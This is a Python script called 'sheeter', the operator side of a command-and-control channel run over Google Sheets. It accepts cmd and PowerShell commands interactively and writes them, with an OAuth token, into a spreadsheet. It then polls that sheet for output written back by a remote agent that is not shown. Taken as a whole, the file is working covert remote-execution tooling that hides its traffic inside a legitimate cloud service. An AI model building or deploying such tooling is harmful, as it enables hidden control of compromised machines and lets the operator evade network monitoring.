from __future__ import print_function
import time
import uuid
import pickle
import os.path
import argparse
from googleapiclient.discovery import build
from google.auth.transport.requests import Request
from google_auth_oauthlib.flow import InstalledAppFlow

# If modifying these scopes, delete the file token.pickle.
SCOPES = ['https://www.googleapis.com/auth/spreadsheets']


ASCIIART = """   _____ _    _ ______ ______ _______ ______ _____  
  / ____| |  | |  ____|  ____|__   __|  ____|  __ \ 
 | (___ | |__| | |__  | |__     | |  | |__  | |__) |
  \___ \|  __  |  __| |  __|    | |  |  __| |  _  / 
  ____) | |  | | |____| |____   | |  | |____| | \ \ 
 |_____/|_|  |_|______|______|  |_|  |______|_|  \_\
                                                    
                                                    """

# The ID and range of a sample spreadsheet.
SPREADSHEETID = '1X1ATfmiV_P_ZYyhFSdAKDklPQSYq-9DCBfZtLR5qmes'
randomId = str(uuid.uuid4())

def getCreds():
    creds = None
    # The file token.pickle stores the user's access and refresh tokens, and is
    # created automatically when the authorization flow completes for the first
    # time.
    if os.path.exists('token.pickle'):
        with open('token.pickle', 'rb') as token:
            creds = pickle.load(token)

    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                'credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('token.pickle', 'wb') as token:
            pickle.dump(creds, token)

    with open('token.json', 'w') as tokenjson:
        tokenjson.write(creds.to_json())
    
    return creds


def getCommandOutput(sheet, sprid):
    range = 'Sheet1!C1:C1000'
    result = sheet.values().get(spreadsheetId=sprid, range=range).execute()
    values = result.get('values', [])
    # Generate a new random id
    global randomId
    randomId = str(uuid.uuid4())

    # Print output
    if not values:
        return True
    else:
        for row in values:
            print(row[0])
    return False



def writeHeadersToSheet(sheet, sprid):
    range = 'Sheet1!A1:B2'
    # read json token and write to sheet
    tokenjson = "none"
    if os.path.exists('token.json'):
        with open('token.json', 'r') as token:
            tokenjson = token.read()
    values = [[randomId, tokenjson]]
    body = {'values' : values,'majorDimension' : 'ROWS',}
    resultClear = sheet.values().update(spreadsheetId=sprid, range=range, valueInputOption='RAW', body=body).execute()
    # Print output
    if not resultClear:
        print('Failed writing headers')
    else:
        print("Wrote Headers")


def cleanSpreadSheet(sheet, sprid):
    range = 'Sheet1!A1:Z'
    body = {}
    resultClear = sheet.values().clear(spreadsheetId=sprid, range=range, body=body).execute()
    # Print output
    if not resultClear:
        print('Failed to clean')
    else:
        print('Done Cleaning')

def uploadCommandsToSheet(sheet, sprid, commands):
    range = 'Sheet1!A2'
    values = commands
    body = {'values' : values,'majorDimension' : 'ROWS',}
    resultClear = sheet.values().update(spreadsheetId=sprid, range=range, valueInputOption='RAW', body=body).execute()
    # Print output
    if not resultClear:
        print('No data found.')
    else:
        print("Done upload commands")

def writeCommands(sheet, sprid, commands):
    cleanSpreadSheet(sheet, sprid)
    writeHeadersToSheet(sheet, sprid)
    uploadCommandsToSheet(sheet, sprid, commands)


def buildspreadsheetConnector(creds):
    service = build('sheets', 'v4', credentials=creds)
    # Call the Sheets API
    sheet = service.spreadsheets()
    return sheet



def getCommands():
        commands = []
        userInput = "com"
        commandType = ["cmd", "powershell"]
        commandTypeIndex = 0
        print ("Waiting for command input")
        while userInput:
            currentCommandType = commandType[commandTypeIndex]
            userInput = input(currentCommandType + " -> ")
            if userInput == "s":
                # Switch command Type
                commandTypeIndex = (commandTypeIndex + 1) % 2
                continue
            if userInput == "q":
                print("Thank you for using command builder")
                exit(0)
            if userInput:
                commands.append([currentCommandType, userInput])


        return commands

def checkCommands(commands):

    print("----------------- Command Preview: -----------------")
    for command in commands:
        print(command[0], "-->", command[1])
    print("----------------------------------------------------")
    userInput = input("Are you happy with the commands? Y/n")
    if userInput == "n":
        return False
    global randomId
    randomId = str(uuid.uuid4())
    return True
    

def main():
    parser = argparse.ArgumentParser(description='commands maker for sheeter')
    parser.add_argument("-id","--spreadsheetid",  help="spreadsheet ID to use")
    parser.add_argument("-g", "--generatetoken", help="Generates a new token json file only and exits", action="store_true")
    parser.add_argument("-v", "--verbos", help="increase output verbosity", action="store_true")
    parser.add_argument("-c", "--clean", help="Clean given sheet from all data and exit", action="store_true")
    parser.add_argument("-o", "--output", help="Get last command output from sheet and exit", action="store_true")
    parser.add_argument("-i", "--interactive", help="enter interactive command maker", action="store_true")

    args = parser.parse_args()
    sprid = SPREADSHEETID
    if args.spreadsheetid:
        sprid = args.spreadsheetid

    if (args.generatetoken):
        getCreds()
        print("token.json is ready for sheeter use....")
        print("you can now send it raw in your spreadsheet")
        print("or use it in the sheeter config file (dont forget to escape)")
        return

    creds = getCreds()
    sheet = buildspreadsheetConnector(creds)
    if (args.output):
        print("Last command output:")
        getCommandOutput(sheet, sprid)
        return
    
    if (args.clean):
        print("Clearing Sheet: ", sprid)
        cleanSpreadSheet(sheet, sprid)
        return


    if not args.interactive:
        print ("Thank you for using sheeter and goodbye :)")
        return



    print (ASCIIART)
    print ("========== Welcome to command builder ! ==========")
    print ("Default command type is cmd, you can switch by typing s")
    print ("To exit command builder type q")
    print ("Just press enter when you are done")
    while True:
        # Listen for Commands
        commands = getCommands()
        if not checkCommands(commands):
            continue
        writeCommands(sheet, sprid, commands)
        userInput = input("Wait for output ? Y/n")
        if userInput == "n":
            continue
        while getCommandOutput(sheet, sprid):
            time.sleep(5)







if __name__ == '__main__':
    main()